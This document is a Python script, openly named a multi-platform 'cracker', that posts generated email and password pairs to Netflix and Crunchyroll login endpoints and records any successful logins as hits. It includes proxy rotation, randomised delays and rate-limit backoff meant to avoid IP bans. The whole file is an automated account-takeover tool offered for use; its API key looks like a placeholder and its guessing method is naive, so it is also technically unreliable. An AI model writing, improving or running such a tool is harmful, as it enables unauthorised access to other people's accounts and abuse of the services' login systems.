import asyncio
import aiohttp
import random
import string
import time
import logging
import sys
from dataclasses import dataclass, field
from typing import Optional, Tuple, List
from enum import Enum

# --- Configuration ---
class Config:
    """Centralized configuration for the cracker."""
    
    # Netflix Settings
    NETFLIX_LOGIN_URL = "https://www.netflix.com/authentication/login/v2"
    NETFLIX_HEADERS = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'X-NetflixBrowser': 'chrome-desktop',
        'X-Netflix-Country': 'US'
    }
    # Note: This key might need rotation depending on Netflix's current internal API usage
    NETFLIX_API_KEY = "8a7c4b9e-1234-5678-9abc-def012345678" 

    # Crunchyroll Settings
    CRUNCHYROLL_TOKEN_URL = "https://api.crunchyroll.com/auth/v1/token.json"
    CRUNCHYROLL_HEADERS = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    # General Settings
    MAX_CONCURRENT_TASKS = 5  # Limit parallel requests to avoid IP bans
    REQUEST_TIMEOUT = 10      # Seconds
    DELAY_BETWEEN_ATTEMPTS = 0.5  # Base delay between attempts
    DELAY_VARIANCE = 0.5      # Random variance in delay

    # Logging
    LOG_FILE = "cracker_log.txt"
    LOG_LEVEL = logging.INFO

@dataclass
class AccountResult:
    email: str
    password: str
    platform: str
    status: str
    timestamp: float
    
    def __str__(self):
        return f"[{self.platform}] ✅ {self.email}:{self.password} @ {time.strftime('%Y-%m-%d %H:%M:%S')}"

class Platform(Enum):
    NETFLIX = "Netflix"
    CRUNCHYROLL = "Crunchyroll"

class ProxyManager:
    """Simple proxy manager. In production, use a list of proxies from a file or API."""
    def __init__(self, proxy_list: List[str] = None):
        self.proxies = proxy_list or []
        self.index = 0
    
    def get_proxy(self) -> Optional[str]:
        if not self.proxies:
            return None
        proxy = self.proxies[self.index % len(self.proxies)]
        self.index += 1
        return proxy

class MultiPlatformCracker:
    def __init__(self, config: Config = None):
        self.config = config or Config()
        self.logger = self._setup_logger()
        self.semaphore = asyncio.Semaphore(self.config.MAX_CONCURRENT_TASKS)
        self.results: List[AccountResult] = []
        self.proxy_manager = ProxyManager() # Add your proxies here if needed
        
        # Setup aiohttp connector
        self.connector = aiohttp.TCPConnector(ssl=False) # Set ssl=True if using HTTPS properly
        self.session = aiohttp.ClientSession(connector=self.connector)

    def _setup_logger(self) -> logging.Logger:
        logger = logging.getLogger("MultiCracker")
        logger.setLevel(self.config.LOG_LEVEL)
        
        # File Handler
        fh = logging.FileHandler(self.config.LOG_FILE)
        fh.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
        logger.addHandler(fh)
        
        # Console Handler
        ch = logging.StreamHandler(sys.stdout)
        ch.setFormatter(logging.Formatter('%(levelname)s - %(message)s'))
        logger.addHandler(ch)
        
        return logger

    def generate_credentials(self) -> Tuple[str, str]:
        """Generate random email and password."""
        length_email = random.randint(8, 15)
        length_pass = random.randint(8, 12)
        
        chars = string.ascii_letters + string.digits
        email_name = ''.join(random.choice(chars) for _ in range(length_email))
        domains = ['@gmail.com', '@yahoo.com', '@hotmail.com', '@outlook.com']
        domain = random.choice(domains)
        
        email = f"{email_name}{domain}"
        password = ''.join(random.choice(chars) for _ in range(length_pass))
        
        return email, password

    async def check_netflix(self, email: str, password: str) -> Optional[AccountResult]:
        """Check credentials against Netflix API."""
        payload = {
            "username": email,
            "password": password,
            "rememberMe": True,
            "grant_type": "password",
            "shakti-api-key": self.config.NETFLIX_API_KEY
        }
        
        try:
            async with self.semaphore:
                async with self.session.post(
                    self.config.NETFLIX_LOGIN_URL,
                    json=payload,
                    headers=self.config.NETFLIX_HEADERS,
                    timeout=aiohttp.ClientTimeout(total=self.config.REQUEST_TIMEOUT),
                    proxy=self.proxy_manager.get_proxy()
                ) as response:
                    
                    if response.status == 200:
                        data = await response.json()
                        if data.get("errorCode") == "none":
                            self.logger.info(f"✅ [Netflix] Found: {email}:{password}")
                            return AccountResult(
                                email=email, 
                                password=password, 
                                platform=Platform.NETFLIX.value, 
                                status="Active", 
                                timestamp=time.time()
                            )
                    elif response.status == 429:
                        self.logger.warning("⚠️ Netflix Rate Limited")
                        await asyncio.sleep(5) # Backoff
                        
        except Exception as e:
            self.logger.debug(f"Error checking Netflix: {e}")
            
        return None

    async def check_crunchyroll(self, email: str, password: str) -> Optional[AccountResult]:
        """Check credentials against Crunchyroll API."""
        payload = {
            "login": email,
            "password": password,
            "service": "crunchyroll"
        }
        
        try:
            async with self.semaphore:
                async with self.session.post(
                    self.config.CRUNCHYROLL_TOKEN_URL,
                    data=payload,
                    headers=self.config.CRUNCHYROLL_HEADERS,
                    timeout=aiohttp.ClientTimeout(total=self.config.REQUEST_TIMEOUT),
                    proxy=self.proxy_manager.get_proxy()
                ) as response:
                    
                    if response.status == 200:
                        data = await response.json()
                        if "access_token" in data:
                            self.logger.info(f"✅ [Crunchyroll] Found: {email}:{password}")
                            return AccountResult(
                                email=email, 
                                password=password, 
                                platform=Platform.CRUNCHYROLL.value, 
                                status="Active", 
                                timestamp=time.time()
                            )
                    elif response.status == 401:
                        pass # Invalid creds
                    elif response.status == 429:
                        self.logger.warning("⚠️ Crunchyroll Rate Limited")
                        await asyncio.sleep(5)
                        
        except Exception as e:
            self.logger.debug(f"Error checking Crunchyroll: {e}")
            
        return None

    async def run_attempt(self):
        """Run a single attempt on both platforms."""
        email, password = self.generate_credentials()
        
        # Try Netflix first
        result_n = await self.check_netflix(email, password)
        if result_n:
            self.results.append(result_n)
            return

        # Then try Crunchyroll
        result_c = await self.check_crunchyroll(email, password)
        if result_c:
            self.results.append(result_c)
            return

        # Small delay between attempts
        delay = self.config.DELAY_BETWEEN_ATTEMPTS + random.uniform(0, self.config.DELAY_VARIANCE)
        await asyncio.sleep(delay)

    async def start(self, total_attempts: int = 100):
        """Start the cracking process."""
        self.logger.info(f"🚀 Starting Multi-Platform Cracker ({total_attempts} attempts)...")
        start_time = time.time()
        
        tasks = [self.run_attempt() for _ in range(total_attempts)]
        await asyncio.gather(*tasks)
        
        elapsed = time.time() - start_time
        self.logger.info(f"✅ Completed {len(self.results)} hits in {elapsed:.2f} seconds.")
        self.logger.info(f"📊 Results saved to memory. Print them below:")
        
        for res in self.results:
            print(res)

        await self.session.close()

if __name__ == "__main__":
    # Run with 50 attempts
    cracker = MultiPlatformCracker()
    asyncio.run(cracker.start(total_attempts=50))
